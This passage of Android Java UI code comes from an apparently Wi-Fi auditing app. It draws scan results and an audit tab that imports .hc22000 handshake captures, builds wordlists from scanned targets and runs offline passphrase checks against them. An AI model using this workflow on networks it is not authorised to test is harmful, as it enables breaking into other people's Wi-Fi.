            sb.append(L.s("5G 建议 ", "5G -> "))
              .append("ch").append(rep.recommended5)
              .append("  ").append(loadHint(rep.stats5, rep.recommended5))
              .append('\n');
            shown++;
        }

        if (shown == 0) {
            adviceBoxRef.setVisibility(View.GONE);
            return;
        }

        sb.append(L.s("(改路由器信道后重扫，占用会变)",
                "(Rescan after changing your router channel)"));

        adviceCard.setText(sb.toString().trim());
        adviceBoxRef.setVisibility(View.VISIBLE);
    }

    /** 某信道的拥挤度描述 */
    private String loadHint(List<ChannelAnalyzer.ChannelStat> stats, int channel) {
        if (stats == null) return "";
        for (ChannelAnalyzer.ChannelStat st : stats) {
            if (st.channel == channel) {
                if (st.apCount <= 0) return L.s("无占用", "empty");
                return L.f("%d 个 AP", "%d APs", st.apCount);
            }
        }
        return "";
    }

    /**
     * SSID 组头。只有一个 AP 时返回零高度空 View（退化成原平铺列表）；
     * 多 AP 时显示 "名称 · N 个 AP · 跨 M 个信道 · 信号差 X dB"。
     */
    /**
     * SSID 组头。只有一个 AP 时返回零高度空 View（退化成原平铺列表）；
     * 多 AP 时显示 "名称 · N 个 AP · 跨 M 个信道 · 信号差 X dB"。
     *
     * <p>改版后上方加一条极淡分隔线：同 SSID 的多 AP 与前后条目分开，
     * 长列表里更容易看出"这一组到哪儿结束"。
     */
    private View groupHeader(SsidGroup.Group g) {
        if (!g.isMesh()) return new TextView(this);

        LinearLayout box = new LinearLayout(this);
        box.setOrientation(LinearLayout.VERTICAL);
        LinearLayout.LayoutParams bp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        bp.topMargin = px(12);
        bp.bottomMargin = px(6);
        box.setLayoutParams(bp);

        box.addView(AmberTheme.divider(this, dp));

        TextView t = new TextView(this);
        StringBuilder sb = new StringBuilder(g.ssid);
        sb.append("  ").append(L.f("%d 个 AP", "%d APs", g.size()));
        if (g.distinctChannels() > 1) {
            sb.append(" · ").append(L.f("跨 %d 个信道", "%d channels", g.distinctChannels()));
        }
        int spread = g.best.rssi - g.worstRssi();
        if (spread >= 10) {
            sb.append(" · ").append(L.f("信号差 %d dB", "delta %d dB", spread));
        }
        t.setText(sb.toString());
        t.setTextSize(AmberTheme.FS_BODY);
        t.setTextColor(ACCENT);
        t.setTypeface(Typeface.create("sans-serif-medium", Typeface.NORMAL));
        t.setPadding(px(4), px(6), 0, 0);
        box.addView(t);
        return box;
    }

    /**
     * 观测页"没扫到网络"时展示的文案。
     *
     * 不再是干巴巴一句"还没扫描到" —— 而是把 Scanner 记下的真实原因
     * 和特权通道（root）的结果一起摊开，用户一眼能看出
     * 是权限问题、WiFi 没开、还是系统节流。
     */
    private String emptyTextWithDiag() {
        String base = L.s("还没扫描到网络。请确认「定位」开关已打开、WiFi 已开启、权限已授予。",
                "No networks found. Check that Location is on, Wi-Fi is on, and permissions are granted.");
        if (scanner == null) return base;

        StringBuilder sb = new StringBuilder(base);
        String d = scanner.lastDiagnostic();
        if ("LOCATION_OFF".equals(d)) {
            sb.append(L.s("  定位开关没打开 —— 扫描为空最常见的原因，权限给了也没用，请下拉通知栏打开「定位」。",
                    "  Location is off - the most common cause of an empty scan; permissions alone are not enough."));
        }
        if (d != null && !d.isEmpty()) {
            sb.append("\n\n").append(L.s("诊断: ", "Diagnostic: ")).append(d);
        }
        String priv = scanner.privilegedDiagnostic();
        if (priv != null && !priv.isEmpty()) {
            sb.append("\n");
            if ("PRIV_UNAVAILABLE".equals(priv)) {
                sb.append(L.s("系统通道不可用：本机没有可用的 root（判定依赖 su + cmd wifi）。",
                        "System channel unavailable: no working root (verdicts need su + cmd wifi)."));
            } else if ("PRIV_EMPTY".equals(priv)) {
                sb.append(L.s("系统通道可用，但系统本身也没有扫描数据。",
                        "The system channel works, but the system itself has no scan data."));
            } else {
                sb.append(priv);
            }
        }
        return sb.toString();
    }

    /**
     * 信号分布板（替代原来那根单调柱状图）。
     *
     * <h3>为什么换掉柱状图</h3>
     * 原来那根「按信号排序的阶梯」只有形状、没有名字：36 根柱子长得一模一样，
     * 用户看不出哪根是谁 —— 既不构成"分布"的概念，也看不到具体 WiFi。现在给两件事：
     * <ol>
     *   <li><b>五档统计</b>：强/弱各多少台，这才是"分布"；</li>
     *   <li><b>最强 10 台</b>：名字 + 强度条 + dBm，具体是哪个 WiFi 一目了然，
     *       条的颜色与雷达上的点同源（同一个网络两处一个色）。</li>
     * </ol>
     * 其余网络在下方「发现网络」逐行列出，这里不重复堆一遍。
     */
    private void renderSignalBoard(List<NetRecord> visible) {
        if (signalBoard == null) return;
        signalBoard.removeAllViews();
        if (visible == null || visible.isEmpty()) {
            signalBoard.addView(AmberTheme.centeredHint(this,
                    L.s("暂无扫描结果", "No scan results yet")));
            return;
        }

        int[] bands = new int[5];
        for (NetRecord r : visible) {
            bands[Math.max(0, Math.min(4, r.signalLevel()))]++;
        }
        String[] names = {L.s("很弱", "Very weak"), L.s("偏弱", "Weak"), L.s("一般", "Fair"),
                L.s("良好", "Good"), L.s("极强", "Excellent")};
        LinearLayout bandRow = new LinearLayout(this);
        bandRow.setOrientation(LinearLayout.HORIZONTAL);
        for (int lv = 4; lv >= 0; lv--) {
            TextView chip = new TextView(this);
            chip.setText(names[lv] + " " + bands[lv]);
            chip.setTextSize(AmberTheme.FS_LABEL);
            chip.setTextColor(AmberTheme.signalColor(lv));
            chip.setPadding(px(9), px(4), px(9), px(4));
            chip.setBackground(roundBg(AmberTheme.SUNKEN, AmberTheme.RADIUS_CHIP));
            LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                    ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT);
            lp.rightMargin = px(6);
            bandRow.addView(chip, lp);
        }
        signalBoard.addView(bandRow);

        List<NetRecord> top = new ArrayList<>(visible);
        java.util.Collections.sort(top, (a, b) -> b.rssi - a.rssi);
        int shown = Math.min(10, top.size());
        for (int i = 0; i < shown; i++) {
            signalBoard.addView(signalBoardRow(top.get(i)));
        }
        if (top.size() > shown) {
            TextView more = new TextView(this);
            more.setText(L.f("共 %d 台 · 其余 %d 台见下方「发现网络」",
                    "%d APs · the other %d are listed under Networks found",
                    top.size(), top.size() - shown));
            more.setTextSize(AmberTheme.FS_LABEL);
            more.setTextColor(AmberTheme.TEXT_FAINT);
            more.setPadding(0, px(9), 0, 0);
            signalBoard.addView(more);
        }
    }

    /** 分布板的一行：名字 + 强度条 + dBm。 */
    private View signalBoardRow(NetRecord r) {
        LinearLayout row = new LinearLayout(this);
        row.setOrientation(LinearLayout.HORIZONTAL);
        row.setGravity(Gravity.CENTER_VERTICAL);
        LinearLayout.LayoutParams rlp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        rlp.topMargin = px(8);
        row.setLayoutParams(rlp);

        TextView name = new TextView(this);
        name.setText(r.displayName());
        name.setTextSize(AmberTheme.FS_BODY);
        name.setTextColor(TEXT);
        name.setSingleLine(true);
        name.setEllipsize(TextUtils.TruncateAt.END);
        row.addView(name, new LinearLayout.LayoutParams(0,
                ViewGroup.LayoutParams.WRAP_CONTENT, 1.1f));

        // 条长按**档位**取（与雷达上那道环一一对应），不是连续比例 ——
        // 实测环境里大多数 AP 都在 -40~-60，连续比例会让所有条看起来一样长。
        int level = r.signalLevel();
        FrameLayout track = new FrameLayout(this);
        track.setBackground(roundBg(AmberTheme.SUNKEN, 4f));
        View fill = new View(this);
        fill.setBackground(roundBg(AmberTheme.signalColor(level), 4f));
        track.addView(fill, new FrameLayout.LayoutParams(
                px((int) (10 + 82 * (level + 1) / 5f)), ViewGroup.LayoutParams.MATCH_PARENT));
        LinearLayout.LayoutParams tlp = new LinearLayout.LayoutParams(px(94), px(9));
        tlp.leftMargin = px(8);
        tlp.rightMargin = px(8);
        row.addView(track, tlp);

        TextView dbm = new TextView(this);
        dbm.setText(r.rssi + "");
        dbm.setTextSize(AmberTheme.FS_LABEL);
        dbm.setTextColor(AmberTheme.signalColor(r.signalLevel()));
        dbm.setTypeface(Typeface.MONOSPACE);
        dbm.setGravity(Gravity.END);
        row.addView(dbm, new LinearLayout.LayoutParams(px(38),
                ViewGroup.LayoutParams.WRAP_CONTENT));
        return row;
    }

    /**
     * 单个网络一行（卡片样式）。
     *
     * <h3>改了什么</h3>
     * <ul>
     *   <li>左侧多一条 3dp 的**信号色条** —— 列表能竖着扫一眼看强弱；</li>
     *   <li>右侧 dBm 用等宽字体（数字对齐、可比较），等级文字降为辅助；</li>
     *   <li>安全类型改成胶囊：无保护＝红胶囊，已加密＝绿胶囊，扫列表时不再靠读字。</li>
     * </ul>
     * <p>展示的信息与改版前**逐项相同**（BSSID / 信道 / 频段 / 安全 / WPS / 厂商 /
     * 估算距离 / 带宽代际），一个字段都没少。
     */
    /**
     * 单个网络一行（卡片样式）。
     *
     * <h3>第二次修正：内容不许被截断</h3>
     * 第一版把地址与厂商/距离全塞进一行再 ellipsize，结果长 SSID 或长厂商名
     * 会变成 "WP…"（用户截图指出）。现在按信息层级拆开：
     * <ul>
     *   <li><b>名称</b>一行（可以截断 —— 名字本身长，右侧还有固定宽度指标区）；</li>
     *   <li><b>地址行</b>：MAC · 信道 · 频段（等宽，一行放得下）；</li>
     *   <li><b>信息行</b>：带宽代际 · WPS · 厂商 · 估算距离，**允许换行不截断**；</li>
     *   <li>右侧指标区固定宽度（dBm / 等级 / 安全胶囊），所以左边永远不会被挤窄。</li>
     * </ul>
     * 展示字段与最初版本**逐项相同**，只是换了排布方式。
     */
    private View netRow(NetRecord r) {
        LinearLayout row = new LinearLayout(this);
        row.setOrientation(LinearLayout.HORIZONTAL);
        row.setBackground(roundBgStroked(AmberTheme.CARD, AmberTheme.EDGE, AmberTheme.RADIUS_CARD, 0.8f));
        row.setPadding(px(14), px(13), px(12), px(13));
        LinearLayout.LayoutParams rp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        rp.bottomMargin = px(7);
        row.setLayoutParams(rp);

        // 信号色条：等级色，一眼看强弱
        View sigBar = new View(this);
        sigBar.setBackground(roundBgStatic(AmberTheme.signalColor(r.signalLevel()), 2f));
        LinearLayout.LayoutParams slp = new LinearLayout.LayoutParams(
                px(3), ViewGroup.LayoutParams.MATCH_PARENT);
        slp.rightMargin = px(12);
        row.addView(sigBar, slp);

        // 左列：名称 / 地址 / 其余信息
        LinearLayout left = new LinearLayout(this);
        left.setOrientation(LinearLayout.VERTICAL);

        TextView name = new TextView(this);
        name.setText(r.displayName());
        name.setTextSize(AmberTheme.FS_TITLE);
        name.setTextColor(TEXT);
        name.setTypeface(Typeface.create("sans-serif-medium", Typeface.NORMAL));
        name.setSingleLine(true);
        name.setEllipsize(TextUtils.TruncateAt.END);
        left.addView(name);

        TextView addr = new TextView(this);
        addr.setText(r.bssid + "   ch" + r.channel + (r.is5Ghz ? " · 5G" : " · 2.4G"));
        addr.setTextSize(FS_TINY);
        addr.setTextColor(AmberTheme.TEXT_DIM);
        addr.setTypeface(Typeface.MONOSPACE);
        addr.setSingleLine(true);
        LinearLayout.LayoutParams alp2 = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        alp2.topMargin = px(4);
        left.addView(addr, alp2);

        // 信息行：带宽代际（琥珀）+ 其余（次级色）；**可换行，不截断**
        ScanDetail sd = scanner == null ? ScanDetail.UNKNOWN : scanner.detailOf(r);
        String vendor = io.github.wlmosv_png.wpaforge.scan.OuiLookup.isRandomized(r.bssid)
                ? L.s("随机 MAC", "random MAC")
                : io.github.wlmosv_png.wpaforge.scan.OuiLookup.vendor(this, r.bssid);
        StringBuilder meta = new StringBuilder();
        if (!sd.isEmpty()) meta.append(sd.label());
        if (r.wpsSupported) meta.append(meta.length() > 0 ? "  ·  " : "").append("WPS");
        if (vendor != null && !vendor.isEmpty()) {
            meta.append(meta.length() > 0 ? "  ·  " : "").append(vendor);
        }
        if (!r.isHidden() && r.estimatedDistanceMeters() > 0) {
            meta.append(meta.length() > 0 ? "  ·  " : "")
                    .append("≈").append(r.estimatedDistanceMeters()).append("m");
        }
        if (meta.length() > 0) {
            TextView info = new TextView(this);
            android.text.SpannableString sp =
                    new android.text.SpannableString(meta.toString());
            if (!sd.isEmpty()) {
                sp.setSpan(new android.text.style.ForegroundColorSpan(ACCENT), 0,
                        sd.label().length(), android.text.Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);
            }
            info.setText(sp);
            info.setTextSize(FS_TINY);
            info.setTextColor(AmberTheme.TEXT_DIM);
            info.setTypeface(Typeface.MONOSPACE);
            info.setSingleLine(false);          // 允许折行 —— 宁可多一行，不可截断
            info.setMaxLines(2);
            LinearLayout.LayoutParams mlp = new LinearLayout.LayoutParams(
                    ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
            mlp.topMargin = px(3);
            left.addView(info, mlp);
        }

        row.addView(left, new LinearLayout.LayoutParams(0,
                ViewGroup.LayoutParams.WRAP_CONTENT, 1f));

        // 右列：固定宽度（dBm / 等级 / 安全胶囊）
        LinearLayout right = new LinearLayout(this);
        right.setOrientation(LinearLayout.VERTICAL);
        right.setGravity(Gravity.END);
        right.setMinimumWidth(px(76));

        TextView dbm = new TextView(this);
        dbm.setText(r.rssi + " dBm");
        dbm.setTextSize(AmberTheme.FS_BODY);
        dbm.setTextColor(AmberTheme.signalColor(r.signalLevel()));
        dbm.setTypeface(Typeface.MONOSPACE);
        dbm.setGravity(Gravity.END);
        dbm.setSingleLine(true);
        right.addView(dbm);

        TextView lvl = new TextView(this);
        lvl.setText(levelText(r.signalLevel()));
        lvl.setTextSize(FS_TINY);
        lvl.setTextColor(AmberTheme.TEXT_DIM);
        lvl.setGravity(Gravity.END);
        right.addView(lvl);

        TextView sec = new TextView(this);
        boolean weak = r.security == NetRecord.Security.OPEN
                || r.security == NetRecord.Security.WEP;
        sec.setText(weak ? L.s("无保护", "No protection") : securityLabel(r.security));
        sec.setTextSize(FS_TINY);
        sec.setTextColor(weak ? DANGER : OK_GREEN);
        sec.setGravity(Gravity.CENTER);
        sec.setBackground(roundBg(weak ? AmberTheme.DANGER_SOFT_BG : AmberTheme.OK_BG,
                AmberTheme.RADIUS_CHIP));
        sec.setPadding(px(8), px(3), px(8), px(3));
        LinearLayout.LayoutParams sclp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        sclp.topMargin = px(6);
        right.addView(sec, sclp);

        row.addView(right);
        return row;
    }

    /** RSSI → 档位（与 NetRecord.signalLevel 同一把尺子；UI 侧小工具，不动业务类）。 */
    private static int levelOfRssi(int rssi) {
        if (rssi >= -50) return 4;
        if (rssi >= -60) return 3;
        if (rssi >= -70) return 2;
        if (rssi >= -80) return 1;
        return 0;
    }

    private String levelText(int lv) {
        switch (lv) {
            case 4: return L.s("极强", "Excellent");
            case 3: return L.s("良好", "Good");
            case 2: return L.s("一般", "Fair");
            case 1: return L.s("偏弱", "Weak");
            default: return L.s("很弱", "Very weak");
        }
    }

    private String securityLabel(NetRecord.Security s) {
        switch (s) {
            case OPEN: return L.s("开放", "Open");
            case WEP: return L.s("WEP(已过时)", "WEP (deprecated)");
            case WPA: return "WPA";
            case WPA2: return "WPA2";
            case WPA3: return "WPA3(SAE)";
            case WPA2_WPA3: return "WPA2/3(SAE)";
            case OWE: return "OWE";
            default: return L.s("未知", "Unknown");
        }
    }

    // ---------------- 审计页 ----------------

    /**
     * 审计页 —— 1.9.45 重做：四个区块，说明全部收进「?」。
     *
     * <h3>为什么又改（真机反馈原话）</h3>
     * 上一版把「离线校验是什么」「材料为什么这样判断」等整段说明直接铺在页面上，
     * 每个区块前面都顶一块灰底长文；材料还拆成「① 导入」「② 诊断」两张卡，
     * 每条材料再配两条整行大按钮（展开详情 / 选这条做离线校验）。
     * 结果是：页面很长、到处是按钮，用户仍然不知道「我现在该点哪」。
     *
     * <h3>现在</h3>
     * <pre>
     *   顶部卡   离线校验 + [?] + 四步状态条 + 五行现状
     *   ① 材料   摘要一行 + 材料列表（整行可点 = 选中并展开）+ 导入/更换 + 清除
     *   ② 字典   名称 · 条数 · 指纹 + 更换 / 按目标派生 / 按材料 SSID / 字典工具
     *   ③ 校验   摘要 + 进度条 + 阻断原因 + 开始 / 停止
     *   ④ 结果   状态 + 「与当前选择一致吗」+ 字段 + 命中块
     *   运行记录 / 口令强度评估 / 恢复状态（默认折叠）
     * </pre>
     * 页面上**不再有任何整段说明** —— 全部在「?」里，按「怎么用 → 概念 →
     * 状态含义 → 边界」分节。条数、指纹、耗时、实时进度这些**细节照旧显示**。
     */
    private void buildAuditTab() {
        if (radar != null) radar.stopSpin();
        pageAudit.removeAllViews();

        lastVerdict = io.github.wlmosv_png.wpaforge.OfflineRunStore.load(this);
        // 盘上存过内容却解不开 —— 必须和"从没跑过"分开说，否则用户以为结果凭空消失。
        verdictLoadFailed = !lastVerdict.hasResult()
                && io.github.wlmosv_png.wpaforge.OfflineRunStore.lastDecodeFailed(this);
        restoreDictIfPossible();

        // ================= 顶部：标题 + ? + 四步状态条 + 现状 =================
        LinearLayout topCard = AmberTheme.card(this, dp, AmberTheme.RADIUS_CARD);

        LinearLayout topRow = new LinearLayout(this);
        topRow.setOrientation(LinearLayout.HORIZONTAL);
        topRow.setGravity(Gravity.CENTER_VERTICAL);

        TextView topTitle = new TextView(this);
        topTitle.setText(L.s("离线校验", "Offline check"));
        topTitle.setTextSize(AmberTheme.FS_TITLE);
        topTitle.setTextColor(TEXT);
        topTitle.setTypeface(Typeface.create("sans-serif-medium", Typeface.NORMAL));
        topRow.addView(topTitle, new LinearLayout.LayoutParams(0,
                ViewGroup.LayoutParams.WRAP_CONTENT, 1f));

        // 「?」说明入口：与破解页同一个做法（弱底小图标、放在第一张卡的顶行最右）。
        // 说明是「查询」，不是操作，所以不占主按钮的位置，也不铺在页面上。
        ImageView help = new ImageView(this);
        help.setImageDrawable(io.github.wlmosv_png.wpaforge.ui.DictIcons.sized(
                io.github.wlmosv_png.wpaforge.ui.DictIcons.Kind.HELP,
                AmberTheme.ACCENT, dp, 20f));
        help.setContentDescription(L.s("说明", "Help"));
        help.setPadding(px(9), px(9), px(9), px(9));
        help.setBackground(roundBg(AmberTheme.CARD_3, AmberTheme.RADIUS_CHIP));
        help.setLayoutParams(new LinearLayout.LayoutParams(px(38), px(38)));
        help.setOnClickListener(v -> showAuditHelp());
        topRow.addView(help);
        topCard.addView(topRow);

        auditFlowStrip = new LinearLayout(this);
        auditFlowStrip.setOrientation(LinearLayout.HORIZONTAL);
        topCard.addView(auditFlowStrip, topGap(12));

        auditOverviewBox = new LinearLayout(this);
        auditOverviewBox.setOrientation(LinearLayout.VERTICAL);
        topCard.addView(auditOverviewBox, topGap(14));
        auditStepCards[0] = topCard;
        pageAudit.addView(topCard);

        // ================= ① 材料 =================
        pageAudit.addView(sectionLabel(L.s("① 握手材料", "① Handshake material")));
        LinearLayout matCard = AmberTheme.card(this, dp, AmberTheme.RADIUS_CARD);

        auditImportBtn = AmberTheme.action(this, dp,
                L.s("导入材料（.hc22000 / .22000）",
                        "Import material (.hc22000 / .22000)"), AmberTheme.BTN_PRIMARY);
        auditImportBtn.setOnClickListener(v -> showOfflinePicker());
        matCard.addView(auditImportBtn);

        auditMatBox = new LinearLayout(this);
        auditMatBox.setOrientation(LinearLayout.VERTICAL);
        matCard.addView(auditMatBox, topGap(10));

        auditDiagBox = new LinearLayout(this);
        auditDiagBox.setOrientation(LinearLayout.VERTICAL);
        matCard.addView(auditDiagBox, topGap(8));

        auditClearMatBtn = rowAction(L.s("清除材料（回到未导入）", "Clear material"));
        auditClearMatBtn.setOnClickListener(v -> clearMaterialAction());
        matCard.addView(groupDivider(10));
        matCard.addView(auditClearMatBtn);
        auditStepCards[1] = matCard;
        pageAudit.addView(matCard);

        // ================= ② 字典 =================
        pageAudit.addView(sectionLabel(L.s("② 候选口令字典", "② Candidate dictionary")));
        LinearLayout dictCard = AmberTheme.card(this, dp, AmberTheme.RADIUS_CARD);
        auditDictBox = new LinearLayout(this);
        auditDictBox.setOrientation(LinearLayout.VERTICAL);
        dictCard.addView(auditDictBox);

        // 空字典时的直达入口。新用户的第一个状态就是"我没有字典"，
        // 而「字典管理」原来埋在第 4 行、名字还叫「字典工具」——
        // 连提示语里写的「去字典管理」都对不上，等于没有入口。
        auditDictEmptyCta = new LinearLayout(this);
        auditDictEmptyCta.setOrientation(LinearLayout.VERTICAL);
        dictCard.addView(auditDictEmptyCta, topGap(12));

        // ① 字典管理放第一行：新建 / 导入 / 清理都在里面，用词与提示语一致。
        Button dManage = rowAction(L.s("字典管理（新建 / 导入 / 清理）",
                "Manage dictionaries (create / import / clean)"));
        dManage.setTextColor(ACCENT);
        dManage.setOnClickListener(v -> openDictManager());
        dictCard.addView(groupDivider(10));
        dictCard.addView(dManage);

        // ② 从已有的里挑一本（最常用的动作）
        auditChangeDictBtn = rowAction(L.s("更换字典（从已有的里挑一本）",
                "Change dictionary (pick an existing one)"));
        auditChangeDictBtn.setOnClickListener(v -> showDictPicker());
        dictCard.addView(groupDivider(2));
        dictCard.addView(auditChangeDictBtn);

        // ③ 现场派生
        Button d2 = rowAction(L.s("按目标派生（选一个扫描到的网络）",
                "Derive from a scanned target"));
        d2.setOnClickListener(v -> pickTargetForDerive(true));
        dictCard.addView(groupDivider(2));
        dictCard.addView(d2);

        auditDeriveMat = rowAction("");
        auditDeriveMat.setOnClickListener(v -> confirmDeriveFromMaterial());
        dictCard.addView(groupDivider(2));
        dictCard.addView(auditDeriveMat);

        // ④ 兜底：一键造一本通用字典
        Button d3 = rowAction(L.s("内置生成器（快速造一本通用字典）",
                "Built-in generator (quick generic list)"));
        d3.setOnClickListener(v -> buildGenericDictFromAudit());
        dictCard.addView(groupDivider(2));
        dictCard.addView(d3);
        auditStepCards[2] = dictCard;
        pageAudit.addView(dictCard);

        // ================= ③ 开始校验 =================
        pageAudit.addView(sectionLabel(L.s("③ 开始离线校验", "③ Run the offline check")));
        LinearLayout runCard = AmberTheme.card(this, dp, AmberTheme.RADIUS_CARD);

        auditRunBox = new LinearLayout(this);
        auditRunBox.setOrientation(LinearLayout.VERTICAL);
        runCard.addView(auditRunBox);

        auditInflightBox = new LinearLayout(this);
        auditInflightBox.setOrientation(LinearLayout.VERTICAL);
        auditInflightBox.setVisibility(View.GONE);
        runCard.addView(auditInflightBox, topGap(12));

        auditProgress = new io.github.wlmosv_png.wpaforge.ui.ThinProgress(this);
        auditProgress.setVisibility(View.GONE);
        runCard.addView(auditProgress, topGap(12));

        auditBlocker = new TextView(this);
        auditBlocker.setTextSize(AmberTheme.FS_SMALL);
        auditBlocker.setLineSpacing(px(4), 1f);
        auditBlocker.setBackground(roundBgStatic(AmberTheme.SUNKEN, AmberTheme.RADIUS_CHIP));
        auditBlocker.setPadding(px(13), px(11), px(13), px(11));
        runCard.addView(auditBlocker, topGap(10));

        auditStartBtn = AmberTheme.action(this, dp,
                L.s("开始离线校验", "Run the offline check"), AmberTheme.BTN_PRIMARY);
        auditStartBtn.setOnClickListener(v -> startOfflineRun());
        runCard.addView(auditStartBtn, topGap(10));

        auditStopBtn = AmberTheme.action(this, dp,
                L.s("停止比对   \u25a0", "Stop   \u25a0"), AmberTheme.BTN_DANGER);
        auditStopBtn.setOnClickListener(v -> stopOfflineRun());
        runCard.addView(auditStopBtn, topGap(6));
        auditStepCards[3] = runCard;
        pageAudit.addView(runCard);

        // ================= ④ 结果 =================
        pageAudit.addView(sectionLabel(L.s("④ 离线校验结果", "④ Offline check result")));
        LinearLayout resultCard = AmberTheme.card(this, dp, AmberTheme.RADIUS_CARD);
        offResult = new LinearLayout(this);
        offResult.setOrientation(LinearLayout.VERTICAL);
        resultCard.addView(offResult);
        pageAudit.addView(resultCard);

        // ================= 运行记录 =================
        pageAudit.addView(sectionLabel(L.s("运行记录", "Run records")));
        LinearLayout logCard = AmberTheme.card(this, dp, AmberTheme.RADIUS_CARD);
        auditChanStrip = new LinearLayout(this);
        auditChanStrip.setOrientation(LinearLayout.HORIZONTAL);
        logCard.addView(auditChanStrip);

        auditRecBox = new LinearLayout(this);
        auditRecBox.setOrientation(LinearLayout.VERTICAL);
        auditRecBox.setPadding(px(12), px(12), px(12), px(12));
        auditLogScroll = new ScrollView(this);
        auditLogScroll.setBackground(roundBgStatic(AmberTheme.TERM_BG, AmberTheme.RADIUS_CHIP));
        auditLogScroll.addView(auditRecBox);
        LinearLayout.LayoutParams alp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, px(160));
        alp.topMargin = px(10);
        logCard.addView(auditLogScroll, alp);

        Button clearChan = rowAction(L.s("清空本频道记录", "Clear this channel"));
        clearChan.setOnClickListener(v -> {
            runLog.clearChannel(logChannel);
            renderChannelRecords();
            Toast.makeText(this, L.s("已清空本频道（结果卡与正在跑的任务不受影响）",
                            "Channel cleared (result card and running task untouched)"),
                    Toast.LENGTH_SHORT).show();
        });
        logCard.addView(groupDivider(10));
        logCard.addView(clearChan);
        pageAudit.addView(logCard);

        // ================= 口令强度评估（与离线校验分开） =================
        pageAudit.addView(sectionLabel(L.s("口令强度评估", "Passphrase strength")));
        LinearLayout checkCard = AmberTheme.card(this, dp, AmberTheme.RADIUS_CARD);

        LinearLayout inputRow = new LinearLayout(this);
        inputRow.setOrientation(LinearLayout.HORIZONTAL);
        inputRow.setGravity(Gravity.CENTER_VERTICAL);

        EditText input = new EditText(this);
        input.setHint(L.s("口令", "Passphrase"));
        input.setTextColor(TEXT);
        input.setHintTextColor(AmberTheme.TEXT_FAINT);
        input.setTextSize(AmberTheme.FS_STATE);
        input.setSingleLine(true);
        input.setBackground(roundBgStatic(AmberTheme.SUNKEN, AmberTheme.RADIUS_CHIP));
        input.setPadding(px(14), px(12), px(14), px(12));
        inputRow.addView(input, new LinearLayout.LayoutParams(0,
                ViewGroup.LayoutParams.WRAP_CONTENT, 1f));

        Button check = AmberTheme.action(this, dp, L.s("评估", "Check"), AmberTheme.BTN_PRIMARY);
        LinearLayout.LayoutParams cklp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        cklp.leftMargin = px(10);
        inputRow.addView(check, cklp);
        checkCard.addView(inputRow);

        final TextView checkResult = new TextView(this);
        checkResult.setTextSize(AmberTheme.FS_BODY);
        checkResult.setTextColor(TEXT_DIM);
        checkResult.setLineSpacing(px(4), 1f);
        checkResult.setVisibility(View.GONE);
        checkCard.addView(checkResult, topGap(10));

        check.setOnClickListener(v -> {
            String pw = input.getText().toString();
            if (pw.isEmpty()) return;
            long rank = AuditEngine.rankOf(currentDict, pw);
            String masked = io.github.wlmosv_png.wpaforge.ui.Redact.pw(pw);
            String dn = dictNameNow();
            long dn2 = dictCount();
            if (rank > 0) {
                checkResult.setText(L.f("命中: 在字典第 %d 位 —— 弱口令",
                        "Hit: rank %d - weak passphrase", rank));
                checkResult.setTextColor(AmberTheme.WARN);
                strengthLine(io.github.wlmosv_png.wpaforge.audit.RunLog.Kind.WARN, masked,
                        L.s("在第 ", "at rank ") + rank + L.s(" 位（弱口令）", " (weak)"),
                        L.f("口令（已脱敏）: %s\n在「%s」中第 %d 位（共 %d 条）",
                                "Passphrase (masked): %s\nRank %d of %d in \"%s\"",
                                masked, dn, rank, dn2));
            } else {
                checkResult.setText(L.s("未命中: 不在当前字典里",
                        "Not in the current dictionary"));
                checkResult.setTextColor(AmberTheme.OK);
                strengthLine(io.github.wlmosv_png.wpaforge.audit.RunLog.Kind.OK, masked,
                        L.s("不在字典中", "not in dictionary"),
                        L.f("口令（已脱敏）: %s\n不在「%s」中（共 %d 条）",
                                "Passphrase (masked): %s\nNot in \"%s\" (%d entries)",
                                masked, dn, dn2));
            }
            checkResult.setVisibility(View.VISIBLE);
        });

        strengthRecBox = new LinearLayout(this);
        strengthRecBox.setOrientation(LinearLayout.VERTICAL);
        strengthRecBox.setPadding(px(12), px(12), px(12), px(12));
        strengthLogScroll = new ScrollView(this);
        strengthLogScroll.setBackground(roundBgStatic(AmberTheme.TERM_BG, AmberTheme.RADIUS_CHIP));
        strengthLogScroll.addView(strengthRecBox);
        LinearLayout.LayoutParams slp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, px(104));
        slp.topMargin = px(10);
        checkCard.addView(strengthLogScroll, slp);

        Button clearStrength = rowAction(L.s("清空强度记录", "Clear strength log"));
        clearStrength.setOnClickListener(v -> {
            runLog.strength.clear();
            renderStrengthLog();
        });
        checkCard.addView(groupDivider(10));
        checkCard.addView(clearStrength);
        pageAudit.addView(checkCard);

        // ================= 恢复状态（默认折叠） =================
        pageAudit.addView(sectionLabel(L.s("恢复状态", "Restore state")));
        restoreCard = AmberTheme.card(this, dp, AmberTheme.RADIUS_CARD);
        restoreSummary = new TextView(this);
        restoreSummary.setTextSize(AmberTheme.FS_BODY);
        restoreSummary.setTextColor(TEXT_DIM);
        restoreSummary.setLineSpacing(px(4), 1f);
        restoreCard.addView(restoreSummary);

        restoreList = new LinearLayout(this);
        restoreList.setOrientation(LinearLayout.VERTICAL);
        restoreList.setVisibility(View.GONE);
        restoreCard.addView(restoreList, topGap(8));

        final Button restoreToggle = rowActionPlain(L.s("展开详情   \u2304", "Expand   \u2304"));
        restoreToggle.setOnClickListener(v -> {
            boolean open = restoreList.getVisibility() != View.VISIBLE;
